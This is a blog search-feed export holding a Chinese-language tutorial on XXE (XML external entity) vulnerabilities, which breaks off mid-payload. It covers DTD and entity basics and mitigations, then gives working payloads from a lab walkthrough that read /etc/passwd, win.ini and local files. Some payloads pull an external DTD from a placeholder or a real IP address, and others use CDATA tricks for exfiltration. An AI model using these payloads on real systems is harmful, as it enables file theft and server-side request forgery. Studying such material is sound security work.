<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>XXE漏洞&amp;CVE-2021-29447</title>
    <link href="/2024/07/23/XXE/"/>
    <url>/2024/07/23/XXE/</url>
    
    <content type="html"><![CDATA[<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>XXE漏洞（XML External Entity）是一种安全漏洞，出现在使用XML解析器的应用程序中。当应用程序使用XML解析器解析XML文档时，如果未正确配置解析器，攻击者可以通过在XML文档中插入恶意实体来执行攻击。这些实体可以是外部的，允许攻击者读取本地文件、发起远程HTTP请求等操作。</p><p>XXE漏洞可能导致敏感数据泄露、服务器端请求伪造（SSRF）、拒绝服务（DoS）等安全问题。攻击者可以利用XXE漏洞来读取服务器上的任意文件，包括配置文件、密码文件等敏感信息，或者利用外部实体发起攻击者控制的HTTP请求。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ol><li><strong>XML文档解析过程</strong>：当应用程序解析XML文档时，它会将XML文档的内容分解为各种元素和属性，并将其转换为应用程序可以处理的数据结构。XML解析器在处理过程中遇到实体引用时，会尝试解析该实体。</li><li><strong>实体引用</strong>：XML文档中的实体引用是一种特殊的语法，用于在XML文档中引用外部资源或实体。一般情况下，实体引用被用来引用XML文档中的内部实体，但XXE漏洞的关键在于可以引用外部实体。</li><li><strong>外部实体</strong>：外部实体是XML文档中的一个实体，它的内容位于XML文档之外，可以是本地文件系统上的文件，也可以是通过网络可访问的资源。攻击者利用XXE漏洞的关键就是通过引用恶意构造的外部实体来执行攻击。</li><li><strong>利用漏洞</strong>：攻击者通过在XML文档中插入恶意的实体引用，可以引用包含敏感信息的本地文件，或者通过HTTP请求引用攻击者控制的远程资源。当应用程序解析XML文档时，如果未正确防范XXE漏洞，解析器会尝试解析这些外部实体，导致攻击者能够读取敏感信息、发起攻击等。</li></ol><h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><p>为了预防XXE漏洞，应用程序开发者需要采取一些措施，包括：</p><ol><li>禁用或限制解析器的外部实体支持，以防止攻击者利用外部实体来执行攻击。</li><li>使用安全的XML解析库，这些库可能已经实现了对XXE漏洞的防护措施。</li><li>对用户输入进行严格的验证和过滤，以防止恶意输入进入XML文档。</li><li>限制应用程序对文件系统和网络资源的访问权限，以减少攻击者利用XXE漏洞造成的风险。</li></ol><p>从代码上看，可以利用相关方法禁用外部实体：<br>php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p>java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span>DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(<span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><p>Python:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="hljs-literal">False</span>))<br></code></pre></td></tr></table></figure><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>XML（可扩展标记语言）是一种用于存储和传输数据的标记语言。它由一系列标签组成，这些标签用于标识数据的结构和含义。XML 的设计目标是提供一种通用的方法来描述和交换结构化的信息，它被广泛应用于各种领域，包括 Web 开发、数据交换、配置文件等。</p><p>XML 文件由标签、元素、属性和文本组成。标签用于定义元素的开始和结束，元素是 XML 数据的基本单元，可以包含其他元素或文本。属性是元素的附加信息，用于提供关于元素的额外描述或设置。文本是元素内的数据内容。</p><p>注意：</p><ul><li>所有 XML 元素都须有关闭标签。</li><li>XML 标签对大小写敏感。</li><li>XML 必须正确地嵌套。</li><li>XML 文档必须有根元素。</li><li>XML 的属性值须加引号。</li></ul><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>DTD（document type definition）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p><h3 id="定义方式"><a href="#定义方式" class="headerlink" title="定义方式"></a>定义方式</h3><p>DTD 可被成行地声明于 XML 文档中（内部定义），也可作为一个外部引用。</p><h4 id="内部定义"><a href="#内部定义" class="headerlink" title="内部定义"></a>内部定义</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE bookstore [<br>    &lt;!ELEMENT bookstore (book+)&gt;<br>    &lt;!ELEMENT book (title, author, year, price)&gt;<br>    &lt;!ELEMENT title (#PCDATA)&gt;<br>    &lt;!ELEMENT author (#PCDATA)&gt;<br>    &lt;!ELEMENT year (#PCDATA)&gt;<br>    &lt;!ELEMENT price (#PCDATA)&gt;<br>]&gt;<br>&lt;bookstore&gt;<br>    &lt;book&gt;<br>        &lt;title&gt;Harry Potter&lt;/title&gt;<br>        &lt;author&gt;J.K. Rowling&lt;/author&gt;<br>        &lt;year&gt;2005&lt;/year&gt;<br>        &lt;price&gt;29.99&lt;/price&gt;<br>    &lt;/book&gt;<br>    &lt;book&gt;<br>        &lt;title&gt;Lord of the Rings&lt;/title&gt;<br>        &lt;author&gt;J.R.R. Tolkien&lt;/author&gt;<br>        &lt;year&gt;1954&lt;/year&gt;<br>        &lt;price&gt;25.00&lt;/price&gt;<br>    &lt;/book&gt;<br>&lt;/bookstore&gt;<br></code></pre></td></tr></table></figure><p>DTD 直接嵌入在 XML 文档中，用 <code>&lt;!DOCTYPE&gt;</code> 声明定义了书店的结构。书店包含多个书（book），每本书有标题、作者、出版年份和价格等属性。</p><h4 id="外部引用"><a href="#外部引用" class="headerlink" title="外部引用"></a>外部引用</h4><p>有如下bookstore.dtd文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ELEMENT bookstore (book+)&gt;<br>&lt;!ELEMENT book (title, author, year, price)&gt;<br>&lt;!ELEMENT title (#PCDATA)&gt;<br>&lt;!ELEMENT author (#PCDATA)&gt;<br>&lt;!ELEMENT year (#PCDATA)&gt;<br>&lt;!ELEMENT price (#PCDATA)&gt;<br></code></pre></td></tr></table></figure><p>XML 文档可以通过 <code>DOCTYPE</code> 声明引用这个外部的 DTD 文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE bookstore SYSTEM &quot;bookstore.dtd&quot;&gt;<br>&lt;bookstore&gt;<br>    &lt;book&gt;<br>        &lt;title&gt;Harry Potter&lt;/title&gt;<br>        &lt;author&gt;J.K. Rowling&lt;/author&gt;<br>        &lt;year&gt;2005&lt;/year&gt;<br>        &lt;price&gt;29.99&lt;/price&gt;<br>    &lt;/book&gt;<br>    &lt;book&gt;<br>        &lt;title&gt;Lord of the Rings&lt;/title&gt;<br>        &lt;author&gt;J.R.R. Tolkien&lt;/author&gt;<br>        &lt;year&gt;1954&lt;/year&gt;<br>        &lt;price&gt;25.00&lt;/price&gt;<br>    &lt;/book&gt;<br>&lt;/bookstore&gt;<br></code></pre></td></tr></table></figure><p>其中，外部引用主要有如下两种形式：</p><ol><li><p><strong>Public Identifier（公共标识符）</strong>：使用公共标识符，例如一个 URL，来标识 DTD 的位置。这种方式允许文档引用一个在网络上公开可用的 DTD。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE 根元素名 PUBLIC &quot;公共标识符&quot; &quot;系统标识符&quot;&gt;<br></code></pre></td></tr></table></figure></li><li><p><strong>System Identifier（系统标识符）</strong>：使用一个系统路径或者 URL 来指定 DTD 的位置。这种方式将 DTD 存储在本地文件系统或者网络上的特定位置。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE 根元素名 SYSTEM &quot;系统标识符&quot;&gt;<br></code></pre></td></tr></table></figure></li></ol><h3 id="定义内容"><a href="#定义内容" class="headerlink" title="定义内容"></a>定义内容</h3><p>在dtd中不仅能定义元素，也能定义实体。</p><h4 id="定义元素"><a href="#定义元素" class="headerlink" title="定义元素"></a>定义元素</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE bookstore [<br>    &lt;!ELEMENT bookstore (book+)&gt;<br>    &lt;!ELEMENT book (title, author, year, price)&gt;<br>    &lt;!ELEMENT title (#PCDATA)&gt;<br>    &lt;!ELEMENT author (#PCDATA)&gt;<br>    &lt;!ELEMENT year (#PCDATA)&gt;<br>    &lt;!ELEMENT price (#PCDATA)&gt;<br>]&gt;<br>&lt;bookstore&gt;<br>    &lt;book&gt;<br>        &lt;title&gt;Harry Potter&lt;/title&gt;<br>        &lt;author&gt;J.K. Rowling&lt;/author&gt;<br>        &lt;year&gt;2005&lt;/year&gt;<br>        &lt;price&gt;29.99&lt;/price&gt;<br>    &lt;/book&gt;<br>    &lt;book&gt;<br>        &lt;title&gt;Lord of the Rings&lt;/title&gt;<br>        &lt;author&gt;J.R.R. Tolkien&lt;/author&gt;<br>        &lt;year&gt;1954&lt;/year&gt;<br>        &lt;price&gt;25.00&lt;/price&gt;<br>    &lt;/book&gt;<br>&lt;/bookstore&gt;<br></code></pre></td></tr></table></figure><p>DTD 声明了一个名为 <code>bookstore</code> 的元素，它包含了至少一个 <code>book</code> 元素，其中每个 <code>book</code> 元素必须包含 <code>title</code>、<code>author</code>、<code>year</code> 和 <code>price</code> 四个子元素。</p><h4 id="定义实体"><a href="#定义实体" class="headerlink" title="定义实体"></a>定义实体</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE test [<br>    &lt;!ENTITY authorName &quot;J.K. Rowling&quot;&gt;<br>    &lt;!ENTITY author SYSTEM &quot;author.txt&quot;&gt;<br>]&gt;<br>&lt;test&gt;<br>    &lt;author&gt;&amp;authorName;&lt;/author&gt;<br>    &lt;book&gt;<br>        &lt;title&gt;Harry Potter&lt;/title&gt;<br>        &lt;author&gt;&amp;author;&lt;/author&gt;<br>        &lt;year&gt;2005&lt;/year&gt;<br>        &lt;price&gt;29.99&lt;/price&gt;<br>    &lt;/book&gt;<br>&lt;/test&gt;<br></code></pre></td></tr></table></figure><p>这里DTD 声明了两个实体：<code>authorName</code> 和 <code>author</code>。</p><p><code>authorName</code> 实体是一个内部实体，其值为 “J.K. Rowling”。</p><p><code>author</code> 实体是一个外部实体，其内容来自外部文件 <code>author.txt</code>。</p><p>XML 文档中的 <code>&lt;author&gt;</code> 元素引用了这两个实体，<code>&amp;authorName;</code> 引用了内部实体，而 <code>&amp;author;</code> 引用了外部实体。</p><h2 id="实体类型"><a href="#实体类型" class="headerlink" title="实体类型"></a>实体类型</h2><p>除了上面提到的不同的定义方式和定义的内容，实体也有如下3种类型。</p><h4 id="通用实体"><a href="#通用实体" class="headerlink" title="通用实体"></a>通用实体</h4><p>通用实体用于在XML文档中引用任意的文本片段，类似于变量。</p><p>通用实体通过<code>&lt;!ENTITY&gt;</code>声明，通过<code>&amp;实体名;</code>来引用通用实体。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE 根元素名 [<br>    &lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;<br>]&gt;<br>&lt;根元素名&gt;<br>    &amp;实体名;<br>&lt;/根元素名&gt;<br></code></pre></td></tr></table></figure><h4 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h4><p>参数实体主要用于在DTD中模块化和重用实体定义。</p><p>参数实体通过<code>&lt;!ENTITY %&gt;</code>声明，在DTD中引用参数实体时，同样使用<code>%</code>符号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % 参数实体名 &quot;参数实体内容&quot;&gt;<br>%参数实体名;<br></code></pre></td></tr></table></figure><h4 id="文本实体"><a href="#文本实体" class="headerlink" title="文本实体"></a>文本实体</h4><p>文本实体与通用实体类似，用于表示在XML文档中引用的文本片段。</p><p>文本实体通过<code>&lt;!ENTITY&gt;</code>声明，通过<code>&amp;实体名;</code>来引用文本实体。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE 根元素名 [<br>    &lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;<br>]&gt;<br>&lt;根元素名&gt;<br>    &amp;实体名;<br>&lt;/根元素名&gt;<br></code></pre></td></tr></table></figure><h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><p>不同语言支持的协议也不同：</p><table><thead><tr><th>libxml2</th><th>PHP</th><th>Java</th><th>.NET</th></tr></thead><tbody><tr><td>file</td><td>file</td><td>http</td><td>file</td></tr><tr><td>http</td><td>http</td><td>https</td><td>http</td></tr><tr><td>ftp</td><td>ftp</td><td>ftp</td><td>https</td></tr><tr><td></td><td>compress.zlib</td><td>file</td><td>ftp</td></tr><tr><td></td><td>compress.bzip2</td><td>jar</td><td></td></tr><tr><td></td><td>data</td><td>netdoc</td><td></td></tr><tr><td></td><td>glob</td><td>mailto</td><td></td></tr><tr><td></td><td>phar</td><td>gopher</td><td></td></tr></tbody></table><h2 id="常用攻击方式"><a href="#常用攻击方式" class="headerlink" title="常用攻击方式"></a>常用攻击方式</h2><h3 id="通用实体-1"><a href="#通用实体-1" class="headerlink" title="通用实体"></a>通用实体</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY b <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">c</span>&gt;</span><span class="hljs-symbol">&amp;b;</span><span class="hljs-tag">&lt;/<span class="hljs-name">c</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="参数实体-dtd"><a href="#参数实体-dtd" class="headerlink" title="参数实体+dtd"></a>参数实体+dtd</h3><p>dtd:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;<br></code></pre></td></tr></table></figure><p>xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % d <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%d;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">c</span>&gt;</span><span class="hljs-symbol">&amp;b;</span><span class="hljs-tag">&lt;/<span class="hljs-name">c</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="通用实体-dtd"><a href="#通用实体-dtd" class="headerlink" title="通用实体+dtd"></a>通用实体+dtd</h3><p>dtd:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;<br></code></pre></td></tr></table></figure><p>xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">c</span>&gt;</span><span class="hljs-symbol">&amp;b;</span><span class="hljs-tag">&lt;/<span class="hljs-name">c</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里直接在DOCTYPE声明中指定了一个外部DTD文件的URL，而没有定义额外的实体。XML解析器在解析DOCTYPE声明时就会直接加载外部DTD文件。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>借助XXE-LAB进行尝试，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* autor: c0ny1</span><br><span class="hljs-comment">* date: 2018-2-7</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-variable">$USERNAME</span> = <span class="hljs-string">&#x27;admin&#x27;</span>; <span class="hljs-comment">//账号</span><br><span class="hljs-variable">$PASSWORD</span> = <span class="hljs-string">&#x27;admin&#x27;</span>; <span class="hljs-comment">//密码</span><br><span class="hljs-variable">$result</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br><span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br><span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$creds</span>-&gt;password;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-variable">$USERNAME</span> &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-variable">$PASSWORD</span>)&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);<br>&#125;<br>&#125;<span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">3</span>,<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>其中<code>libxml_disable_entity_loader(false);</code>没有禁止外部实体，存在xxe漏洞。</p><h3 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h3><h4 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h4><p>正常请求如下：</p><p><img src="/2023/04/27/file-upload/240514103454265.png" alt="image-20240514103454265"></p><p>注意content-type为application&#x2F;xml，并且在response中会把username(admin)进行回显，直接定义一个dtd，并且在username标签内引用：</p><p><img src="/2023/04/27/file-upload/240514104833279.png" alt="image-20240514104833279"></p><p>payload如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">ry4n</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>&amp;ry4n;<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>但是如果有特殊字符，就会报错：</p><p><img src="/2023/04/27/file-upload/240514110653779.png" alt="image-20240514110653779"></p><p>可以通过CDATA解决。</p><h5 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h5><h6 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h6><p>CDATA（Character Data）可以用于包含不会被解析器处理的文本。可以将读取的文件内容封装在CDATA中，防止特殊字符被XML解析器误解。</p><p>先给出payload。</p><p>外部dtd如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;file:///d:/test.txt&quot;&gt;<br>&lt;!ENTITY % eval &quot;&lt;!ENTITY exfil &#x27;&lt;![CDATA[%file;]]&gt;&#x27;&gt;&quot;&gt;<br>%eval;<br></code></pre></td></tr></table></figure><p>payload如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///path/to/xxe.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;exfil;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/240514113010101.png" alt="image-20240514113010101"></p><p>报错：实体’&amp;;’被禁止。</p><p>尝试更换payload：</p><p>外部dtd:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; <br>&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">roottag</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">start</span> <span class="hljs-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span>   </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">goodies</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///d:/test.txt&quot;</span>&gt;</span>  </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">end</span> <span class="hljs-string">&quot;]]&gt;&quot;</span>&gt;</span>  </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://23.94.98.161/xxe.dtd&quot;</span>&gt;</span> 